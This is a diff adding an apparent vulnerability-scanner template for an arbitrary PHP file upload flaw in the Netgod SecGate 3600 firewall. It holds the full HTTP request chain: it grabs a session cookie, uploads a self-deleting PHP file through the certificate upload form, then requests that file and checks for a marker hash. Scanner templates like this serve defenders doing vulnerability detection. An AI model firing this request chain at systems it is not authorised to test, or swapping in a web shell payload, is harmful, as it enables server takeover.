@@ -1,0 +1,59 @@
+id: netgod-secgate-3600-file-upload
+info:
+  name: Netgod SecGate 3600 Firewall File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Netgod SecGate 3600 firewall has a file upload vulnerability that allows attackers to gain server control permissions.
+  tags: file-upload
+  reference:
+    - https://www.legendsec.com/newsec.php?up=2&cid=63
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        part: header
+        regex:
+          - "Set-Cookie: __s_sessionid__=(.*?);"
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Length: 577
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="certfile"; filename="{{filename}}.php"
+        Content-Type: text/plain
+
+        <?php echo(md5(233));unlink(__FILE__);?>
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="submit_post"
+
+        sec_web_auth_custom_setting_confsave
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="certfile_r"
+
+        file
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+  - raw:
+      - |
+        GET /attachements/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
